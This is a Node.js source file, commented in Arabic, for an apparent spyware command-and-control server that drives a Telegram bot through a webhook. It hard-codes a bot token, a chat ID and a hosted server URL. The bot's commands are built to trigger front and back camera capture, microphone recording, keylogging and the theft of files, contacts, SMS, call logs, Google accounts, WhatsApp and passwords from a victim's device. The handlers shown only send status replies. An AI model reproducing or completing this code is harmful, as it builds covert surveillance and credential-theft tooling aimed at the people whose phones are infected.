const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7604669338:AAF-Bor_OJ2nHuP3H_-7E8QXVptnTeqFEUA';
const CHAT_ID = '1094651468';
const SERVER_URL = 'https://c2-server-ufyp.onrender.com'; // استخدم رابط خادمك هنا

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// نقطة النهاية (Endpoint) التي سيرسل إليها تيليجرام التحديثات
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    const bot = new TelegramBot(BOT_TOKEN);
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// نقطة نهاية للفحص (Health Check) لإبقاء الخادم مستيقظًا
app.get('/', (req, res) => res.send('C2 Server is running!'));

// تعريف أوامر البوت (نفس الكود السابق)
const bot = new TelegramBot(BOT_TOKEN, { polling: false }); // إيقاف polling
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `✅ *البوت يعمل بنجاح!* ...`);
});
// أضف باقي الأوامر (/help, /camera_front, ...) كما كانت من قبل
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, `📱 *الأوامر المتاحة:*\n🎥 /camera_front\n🎥 /camera_back\n🎙️ /mic\n📂 /files\n📞 /contacts\n✉️ /sms\n📋 /call_logs\n🔔 /notifications\n⌨️ /keylog\n👤 /google_accounts\n💬 /whatsapp\n🔑 /passwords`);
});
bot.onText(/\/camera_front/, (msg) => bot.sendMessage(msg.chat.id, '📸 جاري التقاط الصورة من الكاميرا الأمامية...'));
bot.onText(/\/camera_back/, (msg) => bot.sendMessage(msg.chat.id, '📸 جاري التقاط الصورة من الكاميرا الخلفية...'));
bot.onText(/\/mic/, (msg) => bot.sendMessage(msg.chat.id, '🎙️ جاري تسجيل الصوت...'));
bot.onText(/\/files/, (msg) => bot.sendMessage(msg.chat.id, '📂 جاري سحب الملفات...'));
bot.onText(/\/contacts/, (msg) => bot.sendMessage(msg.chat.id, '📇 جاري سحب جهات الاتصال...'));
bot.onText(/\/sms/, (msg) => bot.sendMessage(msg.chat.id, '✉️ جاري سحب الرسائل...'));
bot.onText(/\/call_logs/, (msg) => bot.sendMessage(msg.chat.id, '📞 جاري سحب سجل المكالمات...'));
bot.onText(/\/notifications/, (msg) => bot.sendMessage(msg.chat.id, '🔔 بدء مراقبة الإشعارات...'));
bot.onText(/\/keylog/, (msg) => bot.sendMessage(msg.chat.id, '⌨️ بدء تسجيل الضغطات...'));
bot.onText(/\/google_accounts/, (msg) => bot.sendMessage(msg.chat.id, '👤 جاري سحب حسابات Google...'));
bot.onText(/\/whatsapp/, (msg) => bot.sendMessage(msg.chat.id, '💬 بدء مراقبة واتساب...'));
bot.onText(/\/passwords/, (msg) => bot.sendMessage(msg.chat.id, '🔑 جاري سحب كلمات المرور...'));

app.listen(PORT, async () => {
    console.log(`✅ Server is listening on port ${PORT}`);
    const botForWebhook = new TelegramBot(BOT_TOKEN);
    // إعداد Webhook: إعلام تيليجرام بالعنوان الجديد الذي سيرسل إليه التحديثات
    await botForWebhook.setWebHook(`${SERVER_URL}/webhook/${BOT_TOKEN}`);
    console.log('✅ Webhook set successfully');
});
